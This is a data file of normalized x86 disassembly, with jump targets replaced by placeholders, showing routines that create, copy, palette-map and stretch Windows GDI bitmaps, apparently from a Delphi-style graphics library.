mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_426500
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427b80
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424ba0
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41888c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_424a18
retn
sub_426774
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403270
sub_426794
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_426500
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40cf90
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_4267f0
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_422b88
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_426500
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_426500
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_42683c
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_4256a0
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4268eb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4268f8
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_426944
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_426500
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_424f0c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424f0c
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_426f92
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026f4
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_426c9c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_424df8
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_424f0c
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_424f0c
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_424f0c
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_424f0c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_426f43
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_426f32
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_426f10
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_424f0c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_4268f8
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028f0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_4256a0
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424118
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_416f14
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423458
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4240dc
call sub_423458
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_424e64
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426f17
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424f0c
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_426ee6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424f0c
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_402714
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423458
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4240dc
call sub_423458
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423458
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4240dc
call sub_423458
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424f0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403ad0
call sub_403ad0
jmp r-xdata
sub_426f39
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_426f48
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403a4c
call sub_403aa0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_426fa8
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_42700c
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_426500
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_427207
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_424f0c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424f0c
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424f0c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4271bf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_426944
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_427218
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_426074
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_426770
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_427280
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax esi
call sub_427990
mov eax [ esi + 0x28 ]
call sub_426774
mov eax [ esi + 0x2c ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b20
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_4272bc
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_427374
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c84
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_427ce0
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_426770
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_426774
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418b4c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_4273ac
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_427990
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42743b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_426fa8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_426944
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_427ce0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_427440
mov eax [ ebp - 0x8 ]
call sub_422b88
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403a4c
call sub_403aa0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_42746c
push ebx
mov ebx eax
mov eax ebx
call sub_427760
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40cf90
pop ebx
retn
sub_42749c
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41a9ec
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_427990
lea eax [ ebx + 0x2c ]
call sub_40cf90
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_427ce0
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_427510
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_424bf4
mov eax ebx
call sub_427b80
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_42789c
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_42774c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_424b20
push eax
call SetStretchBltMode
mov eax ebx
call sub_4277e0
mov dl [ r-xdata ]
call sub_424bf4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_427b20
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4277e0
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427753
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4276e1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_424f0c
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_4277e0
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
